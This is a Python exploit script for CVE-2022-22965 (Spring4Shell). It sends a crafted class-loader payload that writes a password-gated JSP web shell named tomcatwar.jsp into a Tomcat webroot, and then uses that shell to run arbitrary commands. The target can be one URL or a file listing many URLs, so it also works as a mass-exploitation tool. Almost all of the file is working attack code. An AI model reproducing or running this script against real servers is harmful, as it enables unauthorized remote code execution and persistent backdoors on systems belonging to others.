import argparse
import sys
import requests
import time

from urllib.parse import urljoin


def Exploit(url, cmd, debug=False):
    headers = {
        "suffix": "%>//",
        "c1": "Runtime",
        "c2": "<%",
        "DNT": "1",
        "Content-Type": "application/x-www-form-urlencoded"
    }

    data = "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="

    try:
        print("\033[0;36m[<>] Deploying Web Shell in webroot...!\033[0m\n")

        response = requests.post(url, headers=headers, data=data,
                                 timeout=15, allow_redirects=False, verify=False)
        webshellURL = urljoin(url, 'tomcatwar.jsp')
        response = requests.get(webshellURL, timeout=15,
                                allow_redirects=False, verify=False)

        if response.status_code == 200:
            execCmd = '?pwd=j&cmd=' + cmd

            print("\033[0;32m[+] Web Shell Deployed in webroot\033[0m")
            print(
                f"\033[0;36m[+] Navigate to the following URL to execute commands: {webshellURL}{execCmd}\033[0m")
            time.sleep(1)

            response = requests.get(f'{webshellURL}{execCmd}')
            print(f"\033[0;32m[+] Executed Command: {cmd}\033[0m")
            print("\n\033[0;33m"+response.text.split('/')[0]+"\033[0m")
        else:
            print(
                "\033[0;31m[-] Some error occured. Exploit Failed. Target may not be Vulnerable!\033[0m")
    except Exception as e:
        if debug:
            print("\033[0;31m[-] Some error occured. Exploit Failed...!\033[0m")
            print("\033[0;31mError: " + str(e) + "\033[0m")
        else:
            print(
                "\033[0;31m[-] Some error occured. Exploit Failed...! Use -d to print the error.\033[0m\n")
        pass


def main():
    parser = argparse.ArgumentParser(description='CVE-2022-22965 Exploit code')
    parser.add_argument(
        '-f', '--file', help='File containing URLs to exploit', required=False)
    parser.add_argument(
        '-u', '--url', help='Target URL to exploit', required=False)
    parser.add_argument(
        '-c', '--cmd', help='Command to run on target', required=False)
    parser.add_argument(
        '-d', '--debug', help='Print the Error', action="store_true", required=False)

    args = parser.parse_args()

    if len(sys.argv) < 2:
        parser.print_help()
        exit(0)

    if args.url and args.cmd:
        Exploit(args.url, args.cmd, args.debug)
    elif args.url:
        Exploit(args.url, 'whoami', args.debug)

    if args.file:
        with open(args.file) as urls:
            for url in urls.readlines():
                url = url.strip()
                Exploit(url, args.debug)


if __name__ == '__main__':
    main()
